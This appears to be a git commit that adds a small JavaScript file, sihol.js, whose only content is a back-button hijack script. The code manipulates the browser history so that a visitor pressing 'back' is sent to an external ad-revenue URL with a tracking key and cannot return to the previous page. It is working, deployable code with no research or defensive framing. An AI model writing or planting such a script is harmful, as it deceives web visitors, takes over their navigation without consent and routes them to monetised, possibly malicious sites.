9a20d7869fdb442e0edb380c8b5724bcd36e510b
lookatdons <lookatdons@users.noreply.github.com>
2022-01-24 12:27:05 +0700

    Create sihol.js

---
+++ sihol.js
@@ -0,0 +1,13 @@
+(function(window, location) { 
+history.replaceState(null, document.title, location.pathname+"#!/history"); 
+history.pushState(null, document.title, location.pathname); 
+ 
+window.addEventListener("popstate", function() { 
+  if(location.hash === "#!/history") { 
+    history.replaceState(null, document.title, location.pathname); 
+    setTimeout(function(){ 
+      location.replace("https://www.trustedcpmrevenue.com/m2iudzu7tp?key=2874d06402b07858a75d12160cdb5474"); 
+    },10); 
+  } 
+}, false); 
+}(window, location));
